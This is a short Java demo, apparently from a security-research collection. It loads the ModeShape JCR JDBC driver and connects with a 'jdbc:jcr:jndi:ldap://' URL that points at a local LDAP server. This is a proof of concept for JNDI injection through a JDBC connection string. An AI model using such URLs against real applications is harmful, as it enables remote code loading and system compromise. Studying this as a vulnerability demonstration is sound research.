package com.javasec.jdbc.ModeShape;

import java.sql.DriverManager;
import java.sql.SQLException;

public class Demo {
    public static void main(String[] args) throws ClassNotFoundException, SQLException {
        Class.forName("org.modeshape.jdbc.LocalJcrDriver");
        DriverManager.getConnection("jdbc:jcr:jndi:ldap://127.0.0.1:1389/q2s3n8");
    }
}
